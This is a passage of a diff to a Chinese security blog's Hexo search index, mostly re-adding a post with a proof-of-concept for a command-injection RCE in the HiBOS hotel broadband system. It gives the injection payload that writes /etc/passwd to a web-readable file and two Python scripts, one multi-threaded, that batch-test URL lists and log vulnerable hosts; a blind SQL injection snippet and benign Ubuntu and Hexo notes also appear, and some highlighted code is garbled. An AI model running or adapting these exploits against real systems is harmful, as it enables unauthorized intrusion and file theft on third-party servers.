class="string">&#x27;)</span></span><br><span class="line"><span class="string">    parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;file&quot;, default= &#x27;</span><span class="string">&#x27;, help=&#x27;</span>收集的txt<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    (option, args) = parser.parse_args()</span></span><br><span class="line"><span class="string">    # print(parser.parse_args())</span></span><br><span class="line"><span class="string">    url = option.url</span></span><br><span class="line"><span class="string">    file = option.file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if file != &#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        print(&quot;[*] Start .......              [*]&quot;)</span></span><br><span class="line"><span class="string">        with open(file,&#x27;</span><span class="string">r&#x27;) as f:</span></span><br><span class="line"><span class="string">            for line in f.readlines():</span></span><br><span class="line"><span class="string">                url = line.strip()</span></span><br><span class="line"><span class="string">                url = parse_url(url)</span></span><br><span class="line"><span class="string">                exp(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        print(&quot;[*] End .......                [*]&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if url !=&#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        exp(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">    banner()</span></span><br><span class="line"><span class="string">    main()</span></span><br></pre></td></tr></table></figure>
-
-<p>使用多线程 把结果存处output.txt</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">thread = []</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*  HiBOS酒店宽带运营系统RCE漏洞POCv0.2  *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*                      Mamor        *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;     -u ,--url url                   &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;     -f ,--file urls.txt             &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">                url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[*]url形式不符合！ %s [*]&quot;</span> % url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20&gt;../../aaa.txt&amp;id=1&#x27;</span></span><br><span class="line">    url1 = url + payload</span><br><span class="line">    req = requests.get(url=url1, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># print(req.status_code)</span></span><br><span class="line"></span><br><span class="line">    url2 = url + <span class="string">&#x27;/aaa.txt&#x27;</span></span><br><span class="line">    <span class="comment"># print(url2)</span></span><br><span class="line">    req2 = requests.get(url=url2, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;root:x:0:0:root:/root:/bin/bash&#x27;</span> <span class="keyword">in</span> req2.text:</span><br><span class="line">        print(<span class="string">&quot;[*] url:&quot;</span> + url + <span class="string">&quot;--------------存在漏洞[*]&quot;</span>)</span><br><span class="line">        output = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&quot;a+&quot;</span>)  </span><br><span class="line">        output.write(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        output.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] url:&quot;</span> + url + <span class="string">&quot;-------------不存在漏洞[*]&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, default = <span class="string">&#x27;&#x27;</span> , <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;输入url&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, dest=<span class="string">&quot;file&quot;</span>, default= <span class="string">&#x27;&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;收集的txt&#x27;</span>)</span><br><span class="line">    (option, args) = parser.parse_args()</span><br><span class="line">    <span class="comment"># print(parser.parse_args())</span></span><br><span class="line">    url = option.url</span><br><span class="line">    file = option.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] Start .......              [*]&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">                url = line.strip()</span><br><span class="line">                url = parse_url(url)</span><br><span class="line"></span><br><span class="line">                t = threading.Thread(target=exp, args=(url,))</span><br><span class="line">                thread.append(t)</span><br><span class="line">        print(thread)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">            t.join()</span><br><span class="line">                <span class="comment"># exp(url)</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;[*] End .......                [*]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> url !=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        exp(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>POC</category>
-      </categories>
-      <tags>
-        <tag>POC</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Kerberos协议分析</title>
     <url>/posts/e9f6bf8b/</url>
     <content><![CDATA[<h3 id="参与角色"><a href="#参与角色" class="headerlink" title="参与角色"></a>参与角色</h3><ul>
@@ -1933,9 +1916,21 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>PE结构学习(待完成)</title>
-    <url>/posts/d8527941/</url>
-    <content><![CDATA[]]></content>
+    <title>HiBOS酒店宽带运营系统RCE漏洞POC</title>
+    <url>/posts/c20f4593/</url>
+    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload </span><br><span class="line">url + &#x2F;manager&#x2F;radius&#x2F;server_ping.php?ip&#x3D;127.0.0.1|cat &#x2F;etc&#x2F;passwd &gt;..&#x2F;..&#x2F;aaa.txt&amp;id&#x3D;1</span><br><span class="line">访问 url + &#x2F;aaa.txt</span><br><span class="line"></span><br><span class="line">如果存在 root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">说明漏洞存在</span><br></pre></td></tr></table></figure>
+
+<p>v0.1单线程版 后续完善 用法<br><code>python3 poc.py -u url</code><br><code>python3 poc.py -f url.txt</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*  HiBOS酒店宽带运营系统RCE漏洞POCv0.1  *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*                      Mamor        *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;     -f ,--file urls.txt             &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">                url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[*]url形式不符合！ %s [*]&quot;</span> % url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20&gt;../../aaa.txt&amp;id=1&#x27;</span></span><br><span class="line">    url1 = url + payload</span><br><span class="line">%<span class="number">20</span>&gt;../../aaa.txt&amp;<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    req = requests.get(url=url1, headers=header, verify=False)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    url2 = url + &#x27;</span>/aaa.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    req2 = requests.get(url=url2, headers=header, verify=False)</span></span><br><span class="line"><span class="string">    if &#x27;</span>root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash<span class="string">&#x27; in req2.text:</span></span><br><span class="line"><span class="string">        print(&quot;[*] url:&quot; + url + &quot;--------------存在漏洞[*]&quot;)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(&quot;[*] url:&quot; + url + &quot;-------------不存在漏洞[*]&quot;)</span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">    parser = OptionParser()</span></span><br><span class="line"><span class="string">    parser.add_option(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;url&quot;, default = &#x27;</span><span class="string">&#x27; , type=str, help=&#x27;</span>输入url<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;file&quot;, default= &#x27;</span><span class="string">&#x27;, help=&#x27;</span>收集的txt<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    (option, args) = parser.parse_args()</span></span><br><span class="line"><span class="string">    # print(parser.parse_args())</span></span><br><span class="line"><span class="string">    url = option.url</span></span><br><span class="line"><span class="string">    file = option.file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if file != &#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        print(&quot;[*] Start .......              [*]&quot;)</span></span><br><span class="line"><span class="string">        with open(file,&#x27;</span><span class="string">r&#x27;) as f:</span></span><br><span class="line"><span class="string">            for line in f.readlines():</span></span><br><span class="line"><span class="string">                url = line.strip()</span></span><br><span class="line"><span class="string">                url = parse_url(url)</span></span><br><span class="line"><span class="string">                exp(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        print(&quot;[*] End .......                [*]&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if url !=&#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        exp(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">    banner()</span></span><br><span class="line"><span class="string">    main()</span></span><br></pre></td></tr></table></figure>
+
+<p>使用多线程 把结果存处output.txt</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">thread = []</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*  HiBOS酒店宽带运营系统RCE漏洞POCv0.2  *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*                      Mamor        *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;     -u ,--url url                   &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;     -f ,--file urls.txt             &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">                url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[*]url形式不符合！ %s [*]&quot;</span> % url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20&gt;../../aaa.txt&amp;id=1&#x27;</span></span><br><span class="line">    url1 = url + payload</span><br><span class="line">    req = requests.get(url=url1, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># print(req.status_code)</span></span><br><span class="line"></span><br><span class="line">    url2 = url + <span class="string">&#x27;/aaa.txt&#x27;</span></span><br><span class="line">    <span class="comment"># print(url2)</span></span><br><span class="line">    req2 = requests.get(url=url2, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;root:x:0:0:root:/root:/bin/bash&#x27;</span> <span class="keyword">in</span> req2.text:</span><br><span class="line">        print(<span class="string">&quot;[*] url:&quot;</span> + url + <span class="string">&quot;--------------存在漏洞[*]&quot;</span>)</span><br><span class="line">        output = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&quot;a+&quot;</span>)  </span><br><span class="line">        output.write(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        output.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] url:&quot;</span> + url + <span class="string">&quot;-------------不存在漏洞[*]&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, default = <span class="string">&#x27;&#x27;</span> , <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;输入url&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, dest=<span class="string">&quot;file&quot;</span>, default= <span class="string">&#x27;&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;收集的txt&#x27;</span>)</span><br><span class="line">    (option, args) = parser.parse_args()</span><br><span class="line">    <span class="comment"># print(parser.parse_args())</span></span><br><span class="line">    url = option.url</span><br><span class="line">    file = option.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] Start .......              [*]&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">                url = line.strip()</span><br><span class="line">                url = parse_url(url)</span><br><span class="line"></span><br><span class="line">                t = threading.Thread(target=exp, args=(url,))</span><br><span class="line">                thread.append(t)</span><br><span class="line">        print(thread)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">            t.join()</span><br><span class="line">                <span class="comment"># exp(url)</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;[*] End .......                [*]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> url !=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        exp(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>POC</category>
+      </categories>
+      <tags>
+        <tag>POC</tag>
+      </tags>
   </entry>
   <entry>
     <title>Linux虚拟机在NAT模式下主机ping不通虚拟机</title>
@@ -1979,8 +1974,8 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>PTK密钥传递攻击(待完成)</title>
-    <url>/posts/a1faa996/</url>
+    <title>PE结构学习(待完成)</title>
+    <url>/posts/d8527941/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -2000,6 +1995,11 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
 <p>regexp ‘^e[a-z]’ 判断一个表的第二个字符串是否在a-z中</p>
 <p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^e[a-z]&#39; LIMIT 0,1)</code></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>PTK密钥传递攻击(待完成)</title>
+    <url>/posts/a1faa996/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>SID-history攻击(待完成)</title>
@@ -2243,6 +2243,26 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
+    <title>Ubuntu_apt-get安装时报错</title>
+    <url>/posts/e46255d2/</url>
+    <content><![CDATA[<br>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;</span><br><span class="line">sudo mv info&#x2F; info_bak          # 现将info文件夹更名</span><br><span class="line">sudo mkdir info                 # 再新建一个新的info文件夹</span><br><span class="line">sudo apt-get update             # 更新</span><br><span class="line">sudo apt-get -f install         # 修复</span><br><span class="line">sudo mv info&#x2F;* info_bak&#x2F;        # 执行完上一步操作后会在新的info文件夹下生成一些文件，现将这些文件全部移到info_bak文件夹下</span><br><span class="line">sudo rm -rf info                # 把自己新建的info文件夹删掉</span><br><span class="line">sudo mv info_bak info           # 把以前的info文件夹重新改回名</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><code>Reference</code></p>
+<blockquote>
+</blockquote>
+]]></content>
+      <categories>
+        <category>apt-get</category>
+      </categories>
+      <tags>
+        <tag>apt-get</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Struts2复现s2-005</title>
     <url>/posts/9e0365e7/</url>
     <content><![CDATA[<h3 id="S2-005复现"><a href="#S2-005复现" class="headerlink" title="S2-005复现"></a>S2-005复现</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>修复S2-003时存在绕过，S2-003对# 过滤时忽略了Unicode编码，可以使用\u0023或者八进制进行绕过</p>
@@ -2270,23 +2290,16 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>Ubuntu_apt-get安装时报错</title>
-    <url>/posts/e46255d2/</url>
+    <title>Ubuntu安装pip2</title>
+    <url>/posts/2a2a2884/</url>
     <content><![CDATA[<br>
 
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;</span><br><span class="line">sudo mv info&#x2F; info_bak          # 现将info文件夹更名</span><br><span class="line">sudo mkdir info                 # 再新建一个新的info文件夹</span><br><span class="line">sudo apt-get update             # 更新</span><br><span class="line">sudo apt-get -f install         # 修复</span><br><span class="line">sudo mv info&#x2F;* info_bak&#x2F;        # 执行完上一步操作后会在新的info文件夹下生成一些文件，现将这些文件全部移到info_bak文件夹下</span><br><span class="line">sudo rm -rf info                # 把自己新建的info文件夹删掉</span><br><span class="line">sudo mv info_bak info           # 把以前的info文件夹重新改回名</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><code>Reference</code></p>
-<blockquote>
-</blockquote>
-]]></content>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启用 universe 源仓库</span><br><span class="line">sudo add-apt-repository universe</span><br><span class="line"></span><br><span class="line">sudo proxychains4 wget https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;pip&#x2F;2.7&#x2F;get-pip.py </span><br><span class="line"></span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">pip2 -V</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>apt-get</category>
+        <category>Ubuntu</category>
       </categories>
       <tags>
-        <tag>apt-get</tag>
+        <tag>Ubuntu</tag>
       </tags>
   </entry>
   <entry>
@@ -2405,19 +2418,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </categories>
       <tags>
         <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ubuntu安装pip2</title>
-    <url>/posts/2a2a2884/</url>
-    <content><![CDATA[<br>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启用 universe 源仓库</span><br><span class="line">sudo add-apt-repository universe</span><br><span class="line"></span><br><span class="line">sudo proxychains4 wget https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;pip&#x2F;2.7&#x2F;get-pip.py </span><br><span class="line"></span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">pip2 -V</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Ubuntu</category>
-      </categories>
-      <tags>
-        <tag>Ubuntu</tag>
       </tags>
   </entry>
   <entry>
@@ -2720,6 +2720,12 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
+    <title>disable_functions绕过学习(待完成)</title>
+    <url>/posts/9087228f/</url>
+    <content><![CDATA[<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://mp.weixin.qq.com/s/PpKvrlwnHbhWGacXEausBg">https://mp.weixin.qq.com/s/PpKvrlwnHbhWGacXEausBg</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>find命令与提权</title>
     <url>/posts/355e240e/</url>
     <content><![CDATA[<h3 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h3><table>
@@ -2866,25 +2872,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>disable_functions绕过学习(待完成)</title>
-    <url>/posts/9087228f/</url>
-    <content><![CDATA[<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://mp.weixin.qq.com/s/PpKvrlwnHbhWGacXEausBg">https://mp.weixin.qq.com/s/PpKvrlwnHbhWGacXEausBg</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>hexo基本使用</title>
-    <url>/posts/d4fee3ae/</url>
-    <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #生产静态网页<br><code>hexo s </code> == <code>hexo server</code> #启动服务预览<br><code>hexo d</code> == <code>hexo deploy</code> #部署<br><code>hexo clean</code> #清除缓存</p>
-<h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><p><code>hexo new post “标题”</code>  新建一篇文章  然后会在_post目录下找到新增的.md文件，用此文件来存方所习得内容编写完markdown文件后，根目录下输入<code> hexo g</code>生产静态页面。输入<code>hexo s</code>本地预览效果，<code>hexo d</code>上传至GitHub</p>
-]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>github渗透测试工具集-转</title>
     <url>/posts/a25c6c18/</url>
     <content><![CDATA[<p>转自: <a href="https://mp.weixin.qq.com/s?__biz=Mzg5NDMzNjYxOA==&amp;mid=2247487430&amp;idx=1&amp;sn=d1a0ecdbe455d068804d540c12d4070b&amp;source=41#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg5NDMzNjYxOA==&amp;mid=2247487430&amp;idx=1&amp;sn=d1a0ecdbe455d068804d540c12d4070b&amp;source=41#wechat_redirect</a></p>
@@ -2919,14 +2906,10 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>hexo文章模板设置</title>
-    <url>/posts/2b14b1c3/</url>
-    <content><![CDATA[<p>打开hexo项目文件夹张的scaffold中的<code>post.md</code>和<code>draft.md</code>,并修改<br>对应的是 <code>hexo new &lt;title&gt;</code> 默认是<code>post</code>，草稿是<code>draft</code></p>
-<blockquote>
-<hr>
-<p>title: hexo文章模板设置<br>tags:<br>categories:<br>description:<br>date: 1616291706000</p>
-<hr>
-</blockquote>
+    <title>hexo基本使用</title>
+    <url>/posts/d4fee3ae/</url>
+    <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #生产静态网页<br><code>hexo s </code> == <code>hexo server</code> #启动服务预览<br><code>hexo d</code> == <code>hexo deploy</code> #部署<br><code>hexo clean</code> #清除缓存</p>
+<h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><p><code>hexo new post “标题”</code>  新建一篇文章  然后会在_post目录下找到新增的.md文件，用此文件来存方所习得内容编写完markdown文件后，根目录下输入<code> hexo g</code>生产静态页面。输入<code>hexo s</code>本地预览效果，<code>hexo d</code>上传至GitHub</p>
 ]]></content>
       <categories>
         <category>Hexo</category>
@@ -2960,15 +2943,32 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>hexo阅读全文设置</title>
-    <url>/posts/5605128/</url>
